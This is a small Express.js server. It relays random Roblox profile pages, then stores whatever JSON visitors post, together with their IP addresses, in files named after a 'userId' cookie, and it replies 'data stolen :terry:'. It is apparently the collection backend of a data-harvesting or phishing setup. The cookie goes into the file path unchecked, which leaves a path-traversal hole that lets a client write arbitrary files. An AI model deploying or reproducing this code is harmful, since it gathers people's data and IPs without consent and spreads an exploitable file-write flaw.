import express from "express"
import fetch from "node-fetch"
import fs from "fs"
import cookieParser from "cookie-parser"

const app = express()

app.use((req,res,next)=>{
	console.log(req.url)
	// res.end("y")
	next()
})

app.use(express.static("public"))

function getRandomInt(max) {
	return Math.floor(Math.random() * max);
}

app.get("/roblox", async (req, res)=>{
	let userId = getRandomInt(100000000)
	let response = await fetch("https://www.roblox.com/users/"+userId+"/profile")
	res.end(await response.text())
})

app.use(express.json())
app.use(cookieParser())

app.post("/data", async (req, res)=>{
	let data = req.body
	data.IP = req.headers["x-forwarded-for"].split(", ")[0]
	fs.writeFileSync("data/"+req.cookies["userId"]+".json", JSON.stringify(data,null,2))
	res.end("data stolen :terry:")
})

app.listen(3001)